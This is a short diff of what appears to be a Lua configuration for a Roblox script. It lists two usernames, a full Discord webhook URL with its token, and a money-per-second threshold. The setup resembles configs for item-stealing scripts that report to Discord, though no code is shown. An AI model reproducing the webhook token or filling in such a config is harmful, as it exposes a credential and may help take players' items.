@@ -1,5 +1,5 @@
 Usernames = {"Alshin233", "wintutorial_2025"}
-Webhook = "https://discord.com/api/webhooks/1430583468726681671/ixT90Q-bpv_qHkW3g1tJZ7qS7MU4O0sUwq_6ZpbSWph99zVhFtfqRdAYeeyfdmTaWTov"
+Webhook = " https://discord.com/api/webhooks/1430583468726681671/ixT90Q-bpv_qHkW3g1tJZ7qS7MU4O0sUwq_6ZpbSWph99zVhFtfqRdAYeeyfdmTaWTov "
 
 -- Priority
 MoneyPerSecond = 500000 -- DEFAULT: 300000/s
